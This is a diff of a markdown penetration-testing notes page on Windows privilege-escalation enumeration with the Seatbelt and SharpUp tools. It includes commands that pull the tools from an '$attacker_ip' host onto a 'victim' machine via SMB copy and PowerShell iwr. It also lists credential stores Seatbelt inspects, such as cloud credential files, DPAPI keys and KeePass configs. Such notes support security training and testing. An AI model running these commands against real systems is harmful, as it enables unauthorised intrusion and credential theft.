@@ -2,9 +2,11 @@
 
 {% embed url="https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md" %}
 
-## `SeatBelt` | https://github.com/GhostPack/Seatbelt
+## `SeatBelt`
 
-> Seatbelt provides an insight into the following sections: _Antivirus, AppLocker Settings, ARP table and Adapter information, Classic and advanced audit policy settings, Autorun executables/scripts/programs, Browser(Chrome/Edge/Brave/Opera) Bookmarks, Browser History, AWS/Google/Azure/Bluemix Cloud credential files, All configured Office 365 endpoints which are synchronized by OneDrive, Credential Guard configuration, DNS cache entries, Dot Net versions, DPAPI master keys, Current environment %PATH$ folders, Current environment variables, Explicit Logon events (Event ID 4648) from the security event log, Explorer most recently used files, Recent Explorer “run” commands, FileZilla configuration files, Installed hotfixes, Installed, “Interesting” processes like any defensive products and admin tools, Internet settings including proxy configs and zones configuration, KeePass configuration files, Local Group Policy settings, Non-empty local groups, Local users, whether they’re active/disabled, Logon events (Event ID 4624), Windows logon sessions, Locates Living Off The Land Binaries and Scripts (LOLBAS) on the system and other information._
+{% embed url="https://github.com/GhostPack/Seatbelt" %}
+
+> Seatbelt provides an **insight** into the following sections: _Antivirus, AppLocker Settings, ARP table and Adapter information, Classic and advanced audit policy settings, Autorun executables/scripts/programs, Browser(Chrome/Edge/Brave/Opera) Bookmarks, Browser History, AWS/Google/Azure/Bluemix Cloud credential files, All configured Office 365 endpoints which are synchronized by OneDrive, Credential Guard configuration, DNS cache entries, Dot Net versions, DPAPI master keys, Current environment %PATH$ folders, Current environment variables, Explicit Logon events (Event ID 4648) from the security event log, Explorer most recently used files, Recent Explorer “run” commands, FileZilla configuration files, Installed hotfixes, Installed, “Interesting” processes like any defensive products and admin tools, Internet settings including proxy configs and zones configuration, KeePass configuration files, Local Group Policy settings, Non-empty local groups, Local users, whether they’re active/disabled, Logon events (Event ID 4624), Windows logon sessions, Locates Living Off The Land Binaries and Scripts (LOLBAS) on the system and other information._
 
 ```bash
 # import to windows machine
@@ -15,14 +17,17 @@ copy \\$attacker_ip\share\Seatbelt.exe
 Seatbelt.exe -group=all
 ```
 
-## `SharpUp` | https://github.com/GhostPack/SharpUp
+## `SharpUp`
+
+{% embed url="https://github.com/GhostPack/SharpUp" %}
 
 > It detects the following: _Modifiable Services, Modifiable Binaries, AlwaysInstallElevated Registry Keys, Modifiable Folders in %PATH%, Modifiable Registry Autoruns, Special User Privileges if any and McAfee Sitelist.xml files_.
 
 ```bash
 # attacker
 python -m SimpleHTTPServer 80
-# windows
+
+# victim windows
 powershell.exe iwr -uri $attacker_ip/SharpUp.exe -o C:\Temp\SharpUp.exe
 SharpUp.
 ```
